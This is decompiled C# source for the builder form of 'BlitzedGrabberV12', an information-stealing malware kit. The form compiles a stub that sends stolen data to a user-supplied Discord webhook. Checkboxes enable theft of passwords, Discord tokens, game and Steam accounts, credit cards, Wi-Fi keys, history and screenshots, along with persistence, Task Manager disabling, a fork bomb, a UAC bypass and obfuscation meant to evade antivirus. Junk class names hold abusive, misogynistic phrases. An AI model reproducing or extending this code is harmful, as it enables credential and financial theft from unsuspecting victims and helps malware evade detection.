using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using BlitzedGrabberV12.Helpers;
using BlitzedGrabberV12.Properties;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Guna.UI2.WinForms;
using Microsoft.CSharp;

namespace BlitzedGrabberV12.Forms
{
	// Token: 0x0200000F RID: 15
	public partial class CheaterTheme : Form
	{
		// Token: 0x06000033 RID: 51
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000034 RID: 52
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000035 RID: 53
		[DllImport("Gdi32.dll")]
		private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

		// Token: 0x06000036 RID: 54 RVA: 0x00002A18 File Offset: 0x00000C18
		public CheaterTheme()
		{
			this.InitializeComponent();
			Program.SetValue("FirstTime", "False");
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00002AAC File Offset: 0x00000CAC
		private void Form1_Load(object sender, EventArgs e)
		{
			new Guna2ShadowForm(this).ShadowColor = Color.FromArgb(110, 68, 255);
			base.Region = Region.FromHrgn(CheaterTheme.CreateRoundRectRgn(0, 0, base.Width, base.Height, 10, 10));
			base.Opacity = 0.98;
			try
			{
				this.guna2TextBox1.Text = Program.GetValue("Webhook");
			}
			catch
			{
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00002B30 File Offset: 0x00000D30
		public void SaveWebhook()
		{
			Program.SetValue("Webhook", this.guna2TextBox1.Text);
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00002B48 File Offset: 0x00000D48
		public string ApplyCode(string code)
		{
			code = code.Replace("false;//PASSWORDS//", this.chckPasswords.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//DISCORDTOKENS//", this.chckTokens.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//MINECRAFT//", this.chckMinecraft.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//WIFI//", this.chckWifi.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//ROBLOX//", this.chckRoblox.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//SCREENSHOT//", this.chckscreenShot.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//HISTORY//", this.chckHistory.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//HWID//", this.chckHWID.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//IPADDRESS//", this.chckIP.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//CREDIT//", this.chckCC.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//MACADDRESS//", this.chckMAC.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//PRODUCTKEY//", this.chckProdKey.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//DEBUGMODE//", this.chckDebug.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//MELTSTUB//", this.chckMelt.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//FAKEERROR//", this.chckFakeError.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//NORDVPN//", this.chckNord.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//STEAM//", this.chckSteam.Checked.ToString().ToLower() + ";");
			return code;
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00002E78 File Offset: 0x00001078
		public string ApplyExtras(string code)
		{
			code = code.Replace("false;//STARTUP//", this.chckStartup.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//TASKMANAGER//", this.chckTaskMgr.Checked.ToString().ToLower() + ";");
			code = code.Replace("false;//FORKBOMB//", this.chckBomb.Checked.ToString().ToLower() + ";");
			return code;
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00002F14 File Offset: 0x00001114
		public void guna2Button3_Click(object sender, EventArgs e)
		{
			string text = this.guna2TextBox2.Text + ".exe";
			this.SaveWebhook();
			ICodeCompiler codeCompiler = new CSharpCodeProvider(new Dictionary<string, string>
			{
				{
					"CompilerVersion",
					"v4.0"
				}
			}).CreateCompiler();
			string outputAssembly = text;
			CompilerParameters compilerParameters = new CompilerParameters();
			compilerParameters.GenerateExecutable = true;
			compilerParameters.OutputAssembly = outputAssembly;
			compilerParameters.ReferencedAssemblies.Add("System.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Net.Http.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Security.dll");
			compilerParameters.ReferencedAssemblies.Add("Microsoft.Csharp.dll");
			compilerParameters.ReferencedAssemblies.Add("netstandard.dll");
			compilerParameters.ReferencedAssemblies.Add("System.ObjectModel.dll");
			compilerParameters.ReferencedAssemblies.Add("System.XML.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Runtime.Serialization.dll");
			compilerParameters.ReferencedAssemblies.Add("Resources\\APIFOR.dll");
			compilerParameters.ReferencedAssemblies.Add("Resources\\BouncyCastle.Crypto.dll");
			compilerParameters.ReferencedAssemblies.Add("Resources\\Newtonsoft.Json.dll");
			compilerParameters.ReferencedAssemblies.Add("Resources\\Anarchy.dll");
			string text2 = Resources.Program;
			string randomCharacters = Methods.getRandomCharacters();
			string newValue = AES256.Encryptor.Encrypt(this.guna2TextBox1.Text, randomCharacters);
			text2 = text2.Replace("//INSERT_WEBHOOK//", newValue);
			text2 = text2.Replace("//PADDING//", randomCharacters);
			text2 = this.ApplyCode(text2);
			text2 = this.ApplyExtras(text2);
			if (this.chckFakeError.Checked)
			{
				text2 = text2.Replace("//ERRORTITLE//", this.errorTitle.Text);
				text2 = text2.Replace("//ERRORMESSAGE//", this.errorMsg.Text);
			}
			if (this.chckIcon.Checked && !string.IsNullOrEmpty(this.iconLoc.Text))
			{
				compilerParameters.CompilerOptions = string.Format("/target:winexe /win32icon:{0}", this.iconLoc.Text);
			}
			string[] sources = new string[]
			{
				text2,
				Resources.Crypter,
				Resources.Plugin,
				Resources.Functions,
				Resources.Password,
				Resources.DiscordTokens,
				Resources.Minecraft,
				Resources.Roblox,
				Resources.Wifi,
				Resources.Screenshot,
				Resources.History,
				Resources.Smalls,
				Resources.Credit,
				Resources.ProductKey,
				Resources.NordVPN,
				Resources.Steam,
				Resources.UACBypass
			};
			CompilerResults compilerResults = codeCompiler.CompileAssemblyFromSourceBatch(compilerParameters, sources);
			if (compilerResults.Errors.Count > 0)
			{
				foreach (object obj in compilerResults.Errors)
				{
					CompilerError compilerError = (CompilerError)obj;
					TextBox textBox = this.textBox1;
					textBox.Text = string.Concat(new string[]
					{
						textBox.Text,
						Environment.NewLine,
						compilerError.FileName,
						Environment.NewLine,
						"Line number ",
						compilerError.Line.ToString(),
						", Error Number: ",
						compilerError.ErrorNumber,
						", '",
						compilerError.ErrorText,
						";"
					});
				}
				return;
			}
			try
			{
				File.Move(text, "Resources\\" + text);
			}
			catch
			{
				File.Delete("Resources\\" + text);
				File.Move(text, "Resources\\" + text);
			}
			using (Process process = new Process())
			{
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.Arguments = string.Concat(new string[]
				{
					"/C Resources\\UltraEmbeddable.exe \"Resources\\",
					text,
					"\" \"",
					text,
					"\""
				});
				process.Start();
				process.WaitForExit();
			}
			if (this.chckCrypter.Checked)
			{
				AssemblyDef assembly = AssemblyDef.Load(text, null);
				ModuleContext moduleContext = ModuleDef.CreateModuleContext();
				ModuleDefMD moduleDefMD = ModuleDefMD.Load(text, moduleContext);
				string str = text.Replace(".exe", "");
				if (this.chckEncNames.Checked)
				{
					this.ProtectNames(assembly, moduleDefMD);
				}
				if (this.chckIntConfuse.Checked)
				{
					CheaterTheme.IntConfusion(moduleDefMD);
				}
				if (this.chckClassSpam.Checked)
				{
					this.TrollClasses(moduleDefMD);
				}
				if (this.chckAttSpam.Checked)
				{
					if (string.IsNullOrEmpty(this.AttributeCount.Text))
					{
						this.AttributeCount.Text = "20";
					}
					this.junkattrib(moduleDefMD);
				}
				moduleDefMD.Write(str + "_Protect.exe");
			}
			this.textBox1.Text = string.Concat(new string[]
			{
				Environment.NewLine,
				"Successfully compiled stub, Find The Stub In The Current Directory!",
				Environment.NewLine,
				"Enjoy!"
			});
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000034BC File Offset: 0x000016BC
		public void guna2Button2_Click(object sender, EventArgs e)
		{
			CheaterTheme.<guna2Button2_Click>d__12 <guna2Button2_Click>d__;
			<guna2Button2_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<guna2Button2_Click>d__.<>4__this = this;
			<guna2Button2_Click>d__.<>1__state = -1;
			<guna2Button2_Click>d__.<>t__builder.Start<CheaterTheme.<guna2Button2_Click>d__12>(ref <guna2Button2_Click>d__);
		}

		// Token: 0x0600003D RID: 61 RVA: 0x000034F4 File Offset: 0x000016F4
		private void guna2Button5_Click(object sender, EventArgs e)
		{
			this.builderPanel.BringToFront();
			this.personalBtn.FillColor = Color.FromArgb(20, 20, 20);
			this.builderButton.FillColor = Color.FromArgb(109, 49, 93);
			this.miscBtn.FillColor = Color.FromArgb(20, 20, 20);
			this.compilerButton.FillColor = Color.FromArgb(20, 20, 20);
			this.defenderButton.FillColor = Color.FromArgb(20, 20, 20);
		}

		// Token: 0x0600003E RID: 62 RVA: 0x0000357C File Offset: 0x0000177C
		private void guna2Button4_Click(object sender, EventArgs e)
		{
			this.compilerPanel.BringToFront();
			this.personalBtn.FillColor = Color.FromArgb(20, 20, 20);
			this.builderButton.FillColor = Color.FromArgb(20, 20, 20);
			this.compilerButton.FillColor = Color.FromArgb(109, 49, 93);
			this.miscBtn.FillColor = Color.FromArgb(20, 20, 20);
			this.defenderButton.FillColor = Color.FromArgb(20, 20, 20);
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00003602 File Offset: 0x00001802
		private void guna2Panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00003604 File Offset: 0x00001804
		private void guna2Panel4_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				CheaterTheme.ReleaseCapture();
				CheaterTheme.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00003602 File Offset: 0x00001802
		private void guna2Panel4_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00003602 File Offset: 0x00001802
		private void CheaterTheme_QueryAccessibilityHelp(object sender, QueryAccessibilityHelpEventArgs e)
		{
		}

		// Token: 0x06000043 RID: 67 RVA: 0x0000362C File Offset: 0x0000182C
		private void defenderButton_Click(object sender, EventArgs e)
		{
			this.defenderPanel.BringToFront();
			this.personalBtn.FillColor = Color.FromArgb(20, 20, 20);
			this.builderButton.FillColor = Color.FromArgb(20, 20, 20);
			this.compilerButton.FillColor = Color.FromArgb(20, 20, 20);
			this.defenderButton.FillColor = Color.FromArgb(109, 49, 93);
			this.miscBtn.FillColor = Color.FromArgb(20, 20, 20);
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00003602 File Offset: 0x00001802
		private void label4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000036B2 File Offset: 0x000018B2
		public string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("kyanite", length)
			select s[this.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000036DC File Offset: 0x000018DC
		public void ProtectNames(AssemblyDef assembly, ModuleDef mod)
		{
			foreach (TypeDef typeDef in mod.Types)
			{
				mod.Name = "AetheryxW";
				if (!typeDef.IsGlobalModuleType && !typeDef.IsRuntimeSpecialName && !typeDef.IsSpecialName && !typeDef.IsWindowsRuntime && !typeDef.IsInterface && !typeDef.Name.Contains("Assembly"))
				{
					foreach (PropertyDef propertyDef in typeDef.Properties)
					{
						if (!propertyDef.IsRuntimeSpecialName)
						{
							propertyDef.Name = this.RandomString(20) + "KryptedWARE";
						}
					}
					foreach (FieldDef fieldDef in typeDef.Fields)
					{
						fieldDef.Name = this.RandomString(20) + "KryptedWARE";
					}
					foreach (EventDef eventDef in typeDef.Events)
					{
						eventDef.Name = this.RandomString(20) + "KryptedWARE";
					}
					foreach (MethodDef methodDef in typeDef.Methods)
					{
						if (!methodDef.Name.Contains("Main") && !methodDef.IsConstructor && !methodDef.IsRuntimeSpecialName && !methodDef.IsRuntime && !methodDef.IsStaticConstructor && !methodDef.IsVirtual)
						{
							methodDef.Name = this.RandomString(20);
						}
					}
				}
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00003954 File Offset: 0x00001B54
		public void TrollClasses(ModuleDefMD module)
		{
			for (int i = 0; i < this.attrib.Length; i++)
			{
				TypeDefUser typeDefUser = new TypeDefUser(this.attrib[i], this.attrib[i], module.CorLibTypes.Object.TypeDefOrRef);
				typeDefUser.Attributes = 16384;
				module.Types.Add(typeDefUser);
			}
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000039BC File Offset: 0x00001BBC
		public void junkattrib(ModuleDefMD module)
		{
			int num = Convert.ToInt32(this.AttributeCount.Text);
			for (int i = 0; i < num; i++)
			{
				TypeDefUser item = new TypeDefUser("KryptedWare" + this.RandomString(20), "KryptedWare" + this.RandomString(20), module.CorLibTypes.Object.TypeDefOrRef);
				module.Types.Add(item);
			}
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00003A38 File Offset: 0x00001C38
		public static void IntConfusion(ModuleDef md)
		{
			foreach (TypeDef typeDef in md.GetTypes())
			{
				if (!typeDef.IsGlobalModuleType)
				{
					foreach (MethodDef methodDef in typeDef.Methods)
					{
						if (methodDef.HasBody)
						{
							for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
							{
								if (methodDef.Body.Instructions[i].IsLdcI4())
								{
									int num = new Random(Guid.NewGuid().GetHashCode()).Next();
									int num2 = new Random(Guid.NewGuid().GetHashCode()).Next();
									int num3 = num ^ num2;
									Instruction instruction = OpCodes.Nop.ToInstruction();
									Local local = new Local(methodDef.Module.ImportAsTypeSig(typeof(int)));
									methodDef.Body.Variables.Add(local);
									methodDef.Body.Instructions.Insert(i + 1, OpCodes.Stloc.ToInstruction(local));
									methodDef.Body.Instructions.Insert(i + 2, Instruction.Create(OpCodes.Ldc_I4, methodDef.Body.Instructions[i].GetLdcI4Value() - 4));
									methodDef.Body.Instructions.Insert(i + 3, Instruction.Create(OpCodes.Ldc_I4, num3));
									methodDef.Body.Instructions.Insert(i + 4, Instruction.Create(OpCodes.Ldc_I4, num2));
									methodDef.Body.Instructions.Insert(i + 5, Instruction.Create(OpCodes.Xor));
									methodDef.Body.Instructions.Insert(i + 6, Instruction.Create(OpCodes.Ldc_I4, num));
									methodDef.Body.Instructions.Insert(i + 7, Instruction.Create(OpCodes.Bne_Un, instruction));
									methodDef.Body.Instructions.Insert(i + 8, Instruction.Create(OpCodes.Ldc_I4, 2));
									methodDef.Body.Instructions.Insert(i + 9, OpCodes.Stloc.ToInstruction(local));
									methodDef.Body.Instructions.Insert(i + 10, Instruction.Create(OpCodes.Sizeof, methodDef.Module.Import(typeof(float))));
									methodDef.Body.Instructions.Insert(i + 11, Instruction.Create(OpCodes.Add));
									methodDef.Body.Instructions.Insert(i + 12, instruction);
									i += 12;
								}
							}
							methodDef.Body.SimplifyBranches();
						}
					}
				}
			}
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00003D64 File Offset: 0x00001F64
		private void chckCrypter_CheckedChanged(object sender, EventArgs e)
		{
			this.chckEncNames.Enabled = this.chckCrypter.Checked;
			this.chckIntConfuse.Enabled = this.chckCrypter.Checked;
			this.chckClassSpam.Enabled = this.chckCrypter.Checked;
			this.chckAttSpam.Enabled = this.chckCrypter.Checked;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00003DC9 File Offset: 0x00001FC9
		private void chckAttSpam_CheckedChanged(object sender, EventArgs e)
		{
			this.AttributeCount.Enabled = this.chckAttSpam.Checked;
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00003602 File Offset: 0x00001802
		private void guna2Panel1_Paint_1(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00003DE4 File Offset: 0x00001FE4
		private void miscBtn_Click(object sender, EventArgs e)
		{
			this.miscPanel.BringToFront();
			this.personalBtn.FillColor = Color.FromArgb(20, 20, 20);
			this.builderButton.FillColor = Color.FromArgb(20, 20, 20);
			this.compilerButton.FillColor = Color.FromArgb(20, 20, 20);
			this.miscBtn.FillColor = Color.FromArgb(109, 49, 93);
			this.defenderButton.FillColor = Color.FromArgb(20, 20, 20);
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00003E6C File Offset: 0x0000206C
		private void guna2Button1_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.InitialDirectory = "c:\\";
				openFileDialog.Filter = "icons|*.ico|ICON Files (*.*)|*.ico";
				openFileDialog.FilterIndex = 2;
				openFileDialog.RestoreDirectory = true;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.iconLoc.Text = openFileDialog.FileName;
				}
			}
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00003EDC File Offset: 0x000020DC
		private void guna2CustomCheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chckIcon.Checked)
			{
				using (OpenFileDialog openFileDialog = new OpenFileDialog())
				{
					openFileDialog.InitialDirectory = "c:\\";
					openFileDialog.Filter = "icons|*.ico|ICON Files (*.*)|*.ico";
					openFileDialog.FilterIndex = 2;
					openFileDialog.RestoreDirectory = true;
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						this.iconLoc.Text = openFileDialog.FileName;
					}
				}
			}
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00003602 File Offset: 0x00001802
		private void guna2TextBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00003602 File Offset: 0x00001802
		private void chckSpread_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00003602 File Offset: 0x00001802
		private void guna2Panel3_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00003602 File Offset: 0x00001802
		private void chckStartup_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00003F58 File Offset: 0x00002158
		private void guna2Button4_Click_1(object sender, EventArgs e)
		{
			Methods.SetTaskManager(true);
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00003F60 File Offset: 0x00002160
		private void personalBtn_Click(object sender, EventArgs e)
		{
			this.personalPage.BringToFront();
			this.builderButton.FillColor = Color.FromArgb(20, 20, 20);
			this.compilerButton.FillColor = Color.FromArgb(20, 20, 20);
			this.miscBtn.FillColor = Color.FromArgb(20, 20, 20);
			this.defenderButton.FillColor = Color.FromArgb(20, 20, 20);
			this.personalBtn.FillColor = Color.FromArgb(109, 49, 93);
		}

		// Token: 0x0400001C RID: 28
		public string[] attrib = new string[]
		{
			"Beat.On.My.Kids.And.I.Show.No.Remorse",
			"Fuck.That.Bitch.Karen.I.Take.Her.To.Court",
			"I.Didnt.Hit.Her",
			"The.Bitch.Must.Have.Fell",
			"The.Police.Dont.Believe.Me.Im.Going.To.Jail",
			"I.Might.Be.Gay.I.Hate.This.chick",
			"If.I.Never.Had.Them.Kids",
			"I.Coulda.Fucked.A.Famous.Bitch",
			"My.Wife.Has.Took.The.Kids",
			"I.Dont.Know.What.I.Did"
		};

		// Token: 0x0400001D RID: 29
		public const int WM_NCLBUTTONDOWN = 161;

		// Token: 0x0400001E RID: 30
		public const int HT_CAPTION = 2;

		// Token: 0x0400001F RID: 31
		public Random random = new Random();
	}
}
